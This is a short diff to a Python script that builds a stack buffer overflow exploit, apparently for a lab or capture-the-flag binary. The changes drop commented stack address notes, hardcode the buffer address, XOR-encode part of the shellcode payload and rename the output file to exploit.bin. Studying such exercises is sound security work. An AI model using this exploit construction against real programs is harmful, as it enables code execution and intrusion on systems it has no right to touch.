@@ -45,21 +45,8 @@ print(disasm(shellcode))
 
 print("[INFO] shellcode len: %d\n"%len(shellcode))
 
-# Esp value @ 0x0804848B
-# ret_address = 0xFFFFDCDC
-
-# Esp value @ 0x08048495
-# buffer_address = 0xFFFFC734
-
-# EBP value @ 0x0804848C
-#ebp_add = 0xFFFFC758
-#buffer_offset =  0x330
-#buffer_address = ebp_add - buffer_offset
-
 buffer_address = 0xFFFFC748 + 0x40
 
-# Offset of the return address from the buffer start
-# ret_offset = 0x334 + 0x4 # 0x330 is the buffer 0x4 is the i + 0x4 for random var_4
 
 #----+--------------------------------
 # Construct the exploit
@@ -105,7 +92,7 @@ pwner = xorcode(pwner[:804]) + pwner[804:]
 # Save the exploit
 #--------------------------------------------
 
-with open("pwner.bin", "wb") as f:
+with open("exploit.bin", "wb") as f:
 	f.write(pwner)
 
 #--------------------------------------------
